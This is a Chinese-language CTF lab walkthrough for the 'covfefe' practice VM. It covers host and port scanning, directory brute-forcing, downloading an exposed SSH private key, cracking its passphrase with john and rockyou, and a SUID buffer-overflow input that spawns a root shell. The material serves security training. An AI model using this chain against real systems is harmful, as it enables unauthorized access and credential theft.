# ssh私钥泄露


参考：[SSH私钥泄露 | wolke](https://wolke.cn/post/e8314d47)



### 一、靶机

#### 1、下载安装

链接

打开方式为VMware Workstation，主机和靶机网络适配器设为相同模式，我的是NAT，有些网络下桥接显示不了IP（宿舍校园网无线和有线显示不了，教学区校园网ip显示不同，不懂

参考：[CTF靶场系列————SSH-私钥泄露 | m0re的小站](https://m0re.top/posts/d77071c4/)

#### 2、准备

靶机开启就行，不需要登入，这一步看情况进行

##### （1）重置靶场密码

重启主机，按e，进入如下界面

找到linux开头一行，末尾添加`init=/bin/bash`，按Crtl+x完成输入 

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181116297.jpg" alt="重置密码" style="zoom: 67%;" />

```bash
mount -o rw,remount /
passwd root  // 重置密码
```

成功后重启虚拟机，以root用户进入

##### （2）查看IP

输入`ip a`，查看靶机IP地址 192.168.130.130

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181455333.jpg" alt="靶机ip" style="zoom:67%;" />



### 二、信息搜集

#### 1、探测靶机IP

- arp-scan

```bash
arp-scan -l
```

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181459012.jpg" alt="arp-scan" style="zoom:67%;" />

- netdiscover

```bash
ip a  // 查看主机ip 192.168.130.128
netdiscover -r 192.168.130.128/24  // -r ip/mask,8/16/24分别表示探索子网的B/C/D段
```

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181526421.jpg" alt="netdiscover" style="zoom: 80%;" />

出现多个ip无法区分，逐一nmap扫描，一般是有开放ssh服务

#### 2、端口与服务扫描

```bash
nmap -sV 192.168.130.130  // -sV 探测开放端口以确定服务/版本信息
```

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181530878.jpg" alt="nmap" style="zoom:67%;" />

发现22-ssh、80-nginx、31337-python，开启了ssh和http服务

常用端口为0到1023，分析特殊端口31337，访问对应网站 192.168.130.130:31337，没有文件

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181537854.jpg" alt="31337" style="zoom:67%;" />

#### 3、目录扫描

- dirsearch

```bash
dirsearch -u 192.168.130.130:31337 
```

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181548929.jpg" alt="dirsearch" style="zoom: 67%;" />

发现robots.txt、/.ssh/id_rsa（私钥）和/.ssh/authorized_keys（认证关键字）等

参考：[id_rsa 与 id_rsa.pub 文件详解 - fengMisaka - 博客园 (cnblogs.com)](https://www.cnblogs.com/linuxAndMcu/p/14487989.html)

- dirb

```bash
dirb http://192.168.130.130:31337
```

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181627497.jpg" alt="dirb" style="zoom: 80%;" />

访问robots.txt

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181633334.jpg" alt="robots" style="zoom: 80%;" />

依次访问以下路径，在http://192.168.130.130:31337/taxex/中看到第一个flag **flag1{make_america_great_again}**

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181636040.jpg" alt="flag1" style="zoom: 80%;" />

使用网站访问下载/.ssh/id_rsa和/.ssh/authorized_keys，发现id_rsa需密码打开，authorized_keys看到疑似账户名**simon**

```bash
// authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzG6cWl499ZGW0PV+tRaOLguT8+lso8zbSLCzgiBYkX/xnoZx0fneSfi93gdh4ynVjs2sgZ2HaRWA05EGR7e3IetSP53NTxk5QrLHEGZQFLId3QMMi74ebGBpPkKg/QzwRxCrKgqL1b2+EYz68Y9InRAZoq8wYTLdoUVa2wOiJv0PfrlQ4e9nh29J7yPgXmVAsy5ZvmpBp5FL76y1lUblGUuftCfddh2IahevizLlVipuSQGFqRZOdA5xnxbsNO4QbFUhjIlA5RrAs814LuA9t2CiAzHXxjsVW8/R/eD8K22TO7XEQscQjaSl/R4Cr1kNtUwCljpmpjt/Q4DJmExOR simon@covfefe
```



### 三、漏洞利用

#### 1、破解秘钥

尝试使用私钥进行ssh连接

```bash
ssh -i id_rsa simon@192.168.130.130
```

失败，发现需输入秘钥id_rsa密码

```bash
locate ssh2john  // 查看路径 /usr/share/john/ssh2john.py
python /usr/share/john/ssh2john.py id_rsa > rsacrack  // 将秘钥信息转化为john可识别信息
zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rule rsacrack  // 利用字典破解
john rsacrack  // 其他方式，默认情况使用自带字典 /usr/share/john/password.lst
```

得到密码 **starwars**

另外，john对一个文件只能爆破一次，再爆破会报错（哭

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
```

需要查看上一次爆破结果可用以下命令

```bash
john --show filename
```

参考：[使用john进行密码爆破](https://blog.csdn.net/FunkyPants/article/details/78648109)

#### 2、ssh连接

```bash
ssh -i id_rsa simon@192.168.130.130
```

报错为文件权限过高问题

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181746573.jpg" alt="right" style="zoom: 80%;" />

修改权限为600

```bash
chmod 600 ./*
ls -la
```

重新连接即可

参考：[Linux文件权限设置 - EnochLin - 博客园 (cnblogs.com)](https://www.cnblogs.com/xsseng/p/9270723.html)

#### 4、提升权限

ls、pwd、whoami查看相关信息，发现root下有个flag.txt，但无权查看，还有一个read_message.c（下面会用到

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181812433.jpg" alt="try"  />

从根目录查找拥有suid特殊权限的文件，并重定向错误信息，防止打断查找

```bash
find / -perm -4000 2>/dev/null
```

<img src="https://gitee.com/giteemof/img/raw/master/img/202206181758802.jpg" alt="find" style="zoom:80%;" />

找到/usr/local/bin/read_message可执行文件，且具有root权限

打开上面找到的源码read_message.c，发现第二个flag **flag2{use_the_source_luke}**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// You're getting close! Here's another flag:
// flag2{use_the_source_luke}

int main(int argc, char *argv[]) {
    char program[] = "/usr/local/sbin/message";
    char buf[20];
    char authorized[] = "Simon";

    printf("What is your name?\n");
    gets(buf);

    // Only compare first five chars to save precious cycles:
    if (!strncmp(authorized, buf, 5)) {
        printf("Hello %s! Here is your message:\n\n", buf);
        // This is safe as the user can't mess with the binary location:
        execve(program, NULL, NULL);
    } else {
        printf("Sorry %s, you're not %s! The Internet Police have been informed of this violation.\n", buf, authorized);
        exit(EXIT_FAILURE);
    }

}

```

源码存在栈溢出问题，输入Simon+15个字符+/bin/sh，即Simonaaaaaaaaaaaaaaa/bin/sh，用/bin/sh覆盖program值运行，提权成功，查看flag.txt，得到 **flag3{das_bof_meister}**

```
You did it! Congratulations, here's the final flag:
flag3{das_bof_meister}
```

参考：[对Linux|suid提权的一些总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/288129.html)



### 四、总结

1. 探测靶机ip，扫描端口与服务，着重关注http服务的特殊端口
2. 扫描目录下隐藏文件
3. 通过rsa私钥、认证关键字获取连接ssh方式与用户名，利用john爆破密码
4. suid提权，寻找具有root权限的可执行文件
5. 一般在root文件夹下有关键信息
6. pwn的栈溢出

